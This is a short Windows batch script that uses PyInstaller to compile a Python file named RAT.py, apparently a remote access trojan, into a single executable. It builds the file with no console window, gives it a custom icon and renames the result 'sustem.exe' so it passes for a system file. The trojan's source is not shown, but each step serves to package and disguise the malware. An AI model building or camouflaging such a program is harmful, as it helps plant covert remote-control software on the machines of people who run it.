cd %temp%
pyinstaller --noconfirm --onefile --windowed --hidden-import plyer.platforms.win.notification --optimize "2" --icon "D:\Working\RAT\icon.ico"  "D:\Working\RAT\RAT.py"
timeout /t 1
xcopy dist D:\Working\RAT /f
ren RAT.exe sustem.exe